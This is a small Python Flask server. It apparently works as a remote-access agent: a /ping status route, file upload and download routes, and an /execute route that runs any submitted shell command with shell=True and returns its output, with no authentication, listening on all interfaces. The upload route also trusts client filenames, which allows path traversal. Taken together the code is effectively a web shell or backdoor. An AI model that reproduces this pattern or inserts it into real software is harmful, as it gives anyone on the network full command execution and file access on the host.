from flask import Flask, request, jsonify, send_from_directory
import os
import subprocess

app = Flask(__name__)
UPLOAD_FOLDER = '/path/to/upload/directory'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'online'})

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return jsonify({'message': 'File uploaded successfully', 'file': file.filename})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.json
    if 'command' not in data:
        return jsonify({'error': 'No command provided'}), 400
    command = data['command']
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return jsonify({'output': result.stdout, 'error': result.stderr, 'returncode': result.returncode})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
